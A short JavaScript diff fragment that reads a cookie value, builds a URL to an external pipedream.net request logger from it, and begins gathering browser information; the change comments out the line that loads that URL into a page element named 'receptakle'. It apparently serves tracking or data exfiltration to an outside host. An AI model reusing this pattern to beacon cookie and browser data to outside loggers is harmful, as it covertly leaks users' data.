@@ -45,7 +45,7 @@ const RANDOM_ID = cookie("id");
 console.log(RANDOM_ID);
 const LOGGER_URL   = "https://enn3hph0pf3197m.m.pipedream.net/" + RANDOM_ID + "/?";
 
-document.getElementById("receptakle").src = LOGGER_URL + "connect";
+//document.getElementById("receptakle").src = LOGGER_URL + "connect";
 
 console.log("work");
 var browserInfos = "";
